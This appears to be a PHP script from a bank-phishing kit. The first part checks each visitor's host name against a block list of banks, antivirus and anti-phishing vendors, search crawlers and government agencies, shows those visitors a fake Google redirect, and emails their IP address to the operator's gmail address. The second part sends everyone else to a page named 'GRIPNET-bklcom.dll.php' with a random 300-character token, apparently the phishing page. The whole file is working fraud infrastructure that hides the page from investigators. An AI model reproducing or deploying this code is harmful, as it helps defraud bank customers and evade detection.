<?php

$uri = $_SERVER["REQUEST_URI"];
$ipserver = $_SERVER["SERVER_ADDR"];
$resuelveserver = gethostbyaddr($ipserver);

$IP = getenv("REMOTE_ADDR");
$host = gethostbyaddr($IP);
$banhosts = array("186.231.96.130","186-231-96-130.livetim.timbrasil.com.br", "bradesco","pish","santander","scotiabank", "google-bot", "google-proxy", "googleproxy", "netcraft.com", "ebay.com", "panda.com","microsoft.com","fbi.gov", "google.com", "msn.com","yahoo.com", "cia.gov", "$resuelveserver", "bankofamerica", "viabcp", "veritas","nod32","antipishing","kapersky", "norton", "symantec","rsasecurity", "bancopopular", "paypal", "unicaja", "movistar", "banesto", "cajamadrid", "bancopastor", "rsa.com", "symantecstore", "gfihispana", "fraudwatchinternational", "verisign", "markmonitor", "anti-phishing", "pandasoftware", "delitosinformaticos", "zonealarm", "alerta-antivirus", "vsantivirus", "nortonsecurityscan", "hauri-la", "cleandir", "trendmicro", "mcafee", "nod32-es", "pandaantivirus", "free-av", "grisoft", "bitdefender-es", "sophos", "activescan", "avast", "bitdefender", "trendmicro-europe", "clamav", "clamwin", "eset", "symantecstore", "f-secure", "hispasec", "vnunet", "seguridad", "security", "monitor", "detector","letti","itau","mx","dufrio");
$x = count($banhosts);

$notfound = "<html>
  <head>
    <title>IU Webmaster redirect</title>
    <META http-equiv='refresh' content='1;URL=http://www.google.com'>
  </head>
  <body bgcolor='#ffffff'>
    <center>The contents you are looking for have moved. You will be redirected to the new location automatically in 1 seconds. Please bookmark the correct page at <a href='http://www.google.com'> http://www.google.com</a>
    </center>
  </body>
</html>
";

$m = "dmnsouza02@gmail.com";

for ($y = 0; $y < $x; $y++) {
   if (strpos($host ,$banhosts[$y])== true) {
     echo $notfound;
	  @mail($m, $banhosts[$y],$IP);
	   exit;
   } 
}

?>
<?php
/**
* Fun��o para gerar senhas aleat�rias
*
* @author    Thiago Belem <contato@thiagobelem.net>
*
* @param integer $tamanho Tamanho da senha a ser gerada
* @param boolean $maiusculas Se ter� letras mai�sculas
* @param boolean $numeros Se ter� n�meros
* @param boolean $simbolos Se ter� s�mbolos
*
* @return string A senha gerada
*/
function geraSenha($tamanho = 8, $maiusculas = true, $numeros = true, $simbolos = false)
{
$lmin = 'abcdefghijklmnopqrstuvwxyz';
$lmai = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
$num = '1234567890';
$simb = '!@#$%*-';
$retorno = '';
$caracteres = '';
$caracteres .= $lmin;
if ($maiusculas) $caracteres .= $lmai;
if ($numeros) $caracteres .= $num;
if ($simbolos) $caracteres .= $simb;
$len = strlen($caracteres);
for ($n = 1; $n <= $tamanho; $n++) {
$rand = mt_rand(1, $len);
$retorno .= $caracteres[$rand-1];
}
return $retorno;
}

$senha = geraSenha(300, true, true, true);

echo "<script>window.location='GRIPNET-bklcom.dll.php?cod=$senha'</script>";

ob_flush();
?>  